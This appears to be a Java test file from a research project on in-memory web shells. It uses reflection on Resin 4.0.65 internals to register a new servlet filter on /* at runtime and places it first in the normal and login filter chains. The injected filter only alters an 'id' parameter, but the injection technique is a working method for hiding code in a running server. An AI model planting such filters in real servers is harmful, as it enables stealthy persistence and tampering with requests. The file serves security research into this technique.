package org.su18.memshell.test.resin;

import com.caucho.server.dispatch.FilterConfigImpl;
import com.caucho.server.dispatch.FilterMapper;
import com.caucho.server.dispatch.FilterMapping;
import com.caucho.server.webapp.WebApp;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.ArrayList;

/**
 * 来自文章 https://www.anquanke.com/post/id/239866
 * 亲测有效
 * 测试版本 Resin 4.0.65
 *
 * @author su18
 */
public class AddResinFilter extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
		try {


			ClassLoader classloader = Thread.currentThread().getContextClassLoader();

			Class servletInvocationcls = classloader.loadClass("com.caucho.server.dispatch.ServletInvocation");
			Class filterConfigimplcls  = classloader.loadClass("com.caucho.server.dispatch.FilterConfigImpl");
			Class filterMappingcls     = classloader.loadClass("com.caucho.server.dispatch.FilterMapping");
			Class filterMappercls      = classloader.loadClass("com.caucho.server.dispatch.FilterMapper");

			Object contextRequest = servletInvocationcls.getMethod("getContextRequest").invoke(null);
			WebApp webapp         = (WebApp) contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);

			String filterName   = "newfilter";
			String urlPattern   = "/*";
			Filter newFilter    = new TestFilter();
			Class  newFiltercls = newFilter.getClass();

			FilterConfigImpl filterConfigimpl = (FilterConfigImpl) filterConfigimplcls.newInstance();
			filterConfigimpl.setFilterName(filterName);
			filterConfigimpl.setFilter(newFilter);
			filterConfigimpl.setFilterClass(newFiltercls);

			webapp.addFilter(filterConfigimpl);

			FilterMapping            filterMapping           = (FilterMapping) filterMappingcls.newInstance();
			FilterMapping.URLPattern filterMappingUrlpattern = filterMapping.createUrlPattern();
			filterMappingUrlpattern.addText(urlPattern);
			filterMappingUrlpattern.init();
			filterMapping.setFilterName(filterName);
			filterMapping.setServletContext(webapp);


			//set filterMapper
			Field fieldWebappFilterMapper = null;
			try {
				fieldWebappFilterMapper = webapp.getClass().getDeclaredField("_filterMapper");
			} catch (NoSuchFieldException Exception) {
				fieldWebappFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_filterMapper");
			}

			fieldWebappFilterMapper.setAccessible(true);
			FilterMapper filtermapper = (FilterMapper) fieldWebappFilterMapper.get(webapp);

			Field fieldFilterMapperFilterMap = filterMappercls.getDeclaredField("_filterMap");
			fieldFilterMapperFilterMap.setAccessible(true);

			ArrayList<FilterMapping> orginalfilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(filtermapper);
			ArrayList<FilterMapping> newFilterMappings     = new ArrayList(orginalfilterMappings.size() + 1);
			newFilterMappings.add(filterMapping);

			int count = 0;
			while (count < orginalfilterMappings.size()) {
				newFilterMappings.add(orginalfilterMappings.get(count));
				++count;
			}

			fieldFilterMapperFilterMap.set(filtermapper, newFilterMappings);
			fieldWebappFilterMapper.set(webapp, filtermapper);

			//set loginFilterMapper
			Field fieldWebappLoginFilterMapper = null;
			try {
				fieldWebappLoginFilterMapper = webapp.getClass().getDeclaredField("_loginFilterMapper");
			} catch (NoSuchFieldException Exception) {
				fieldWebappLoginFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_loginFilterMaper");
			}

			fieldWebappLoginFilterMapper.setAccessible(true);
			FilterMapper loginFilterMapper = (FilterMapper) fieldWebappLoginFilterMapper.get(webapp);

			ArrayList<FilterMapping> orginLoginFilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(loginFilterMapper);
			ArrayList<FilterMapping> newLoginFilterMappings   = new ArrayList(orginLoginFilterMappings.size() + 1);
			newLoginFilterMappings.add(filterMapping);

			count = 0;
			while (count < orginLoginFilterMappings.size()) {
				newLoginFilterMappings.add(orginLoginFilterMappings.get(count));
				++count;
			}

			fieldFilterMapperFilterMap.set(loginFilterMapper, newLoginFilterMappings);
			fieldWebappLoginFilterMapper.set(webapp, loginFilterMapper);

			resp.getWriter().println("Resin Filter added");

			webapp.getClass().getMethod("clearCache").invoke(webapp);

		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	public static class TestFilter implements Filter {

		/**
		 * 初始化 filter
		 *
		 * @param filterConfig FilterConfig
		 */
		@Override
		public void init(FilterConfig filterConfig) {
		}

		/**
		 * doFilter 方法处理过滤器逻辑
		 *
		 * @param servletRequest  ServletRequest
		 * @param servletResponse ServletResponse
		 * @param filterChain     FilterChain
		 * @throws IOException      抛出异常
		 * @throws ServletException 抛出异常
		 */
		@Override
		public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
			// 给下一个过滤器
			filterChain.doFilter(new FilterRequest((HttpServletRequest) servletRequest), servletResponse);
		}

		/**
		 * 销毁时执行的方法
		 */
		@Override
		public void destroy() {
		}

		/**
		 * 自定义 FilterRequest 重写 getParameter 方法处理 id 值
		 */
		class FilterRequest extends HttpServletRequestWrapper {

			public FilterRequest(HttpServletRequest request) {
				super(request);
			}

			@Override
			public String getParameter(String name) {
				if ("id".equals(name)) {
					String originalId = super.getParameter(name);

					if (originalId != null && !originalId.isEmpty()) {
						int idNum = (Integer.parseInt(originalId) * 10);
						return Integer.toString(idNum);
					}
				}
				return super.getParameter(name);
			}
		}
	}

}
